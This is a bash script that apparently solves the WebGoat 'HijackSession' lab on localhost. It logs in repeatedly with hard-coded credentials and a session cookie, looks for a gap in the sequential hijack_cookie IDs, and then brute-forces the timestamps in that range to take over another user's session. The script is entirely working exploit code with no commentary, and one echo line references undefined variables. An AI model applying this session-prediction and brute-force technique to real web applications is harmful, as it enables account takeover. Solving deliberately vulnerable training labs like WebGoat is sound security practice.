#!/bin/bash

username=developer
password=developer
JSESSIONID=YZc3WZ5zJvmCWQJIRijrO_MNtLhba-z4ycyzUIHL

sessionFoundId=0
sessionFoundStartTime=0
sessionFoundEndTime=0
currentSessionId=0
previousSessionId=0
currentSessionTimestamp=0
previousSessionTimestamp=0

echo "================= Searching for session =================================="
echo

for request in $(seq 1 1000); do

currentSession="$(curl -i -v -X POST "http://localhost:8080/WebGoat/HijackSession/login" -H "Cookie: JSESSIONID=$JSESSIONID;" -d "username=$username&password=$password" 2>&1 | grep hijack_cookie | grep -v "< Set-Cookie:" | cut -d'=' -f2 | cut -d';' -f1)"
currentSessionId="$(echo $currentSession | cut -d'-' -f1)"
currentSessionTimestamp="$(echo $currentSession | cut -d'-' -f2)"

echo $currSessId - $currTS

if ! [ -z $previousSessionId ]
then
    if [ $((currentSessionId - previousSessionId)) -eq 2 ]
    then
        echo
        echo "Session found: $previousSessionId - $currentSessionId"
        echo
        sessionFoundId=$((previousSessionId+1))
        sessionFoundStartTime=$previousSessionTimestamp
        sessionFoundEndTime=$currentSessionTimestamp
        break
    fi
fi

previousSessionId=$currentSessionId
previousSessionTimestamp=$currentSessionTimestamp

done

echo
echo "================= Session Found: $sessionFoundId ================="
echo
echo "| From timestamps $sessionFoundStartTime to $sessionFoundEndTime |"
echo
echo "================= Starting session for $sessionFoundId at $sessionFoundStartTime ================="
echo

for timestamp in $(seq -f %1.0f $sessionFoundStartTime $sessionFoundEndTime); do
 
    response=$(curl -v -X POST "http://localhost:8080/WebGoat/HijackSession/login" -H "Cookie: JSESSIONID=$JSESSIONID; hijack_cookie=$sessionFoundId-$timestamp;secure;" -d "username=$username&password=$password" 2>&1 | grep feedback | cut -d':' -f2)
    echo $sessionFoundId-$timestamp: $response

done
